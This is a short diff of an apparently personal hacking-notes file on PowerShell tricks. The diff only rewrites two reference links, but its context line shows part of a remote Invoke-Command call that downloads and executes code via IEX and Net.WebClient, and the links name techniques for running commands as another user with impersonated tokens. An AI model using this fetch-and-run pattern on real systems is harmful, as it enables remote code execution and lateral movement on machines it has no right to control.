@@ -6,10 +6,9 @@ Invoke-Command -Session $sess -ScriptBlock { IEX(New-Object Net.WebClient).downl
 ```
 
 # References
-- [20221003150475](/zet/20221003150475/) powershell tricks run powershell commands as another user
-- [20221003150471](/zet/20221003150471/) powershell tricks run powershell commands as another user on remote machine with impersonated token copy and run file over session
+- [20221003150475](/zet/20221003150475/README.md) powershell tricks run powershell commands as another user
+- [20221003150471](/zet/20221003150471/README.md) powershell tricks run powershell commands as another user on remote machine with impersonated token copy and run file over session
 - ~/kb/hacking/powershell/powershell-tricks.md
 
 Tags:
     #assorted
-
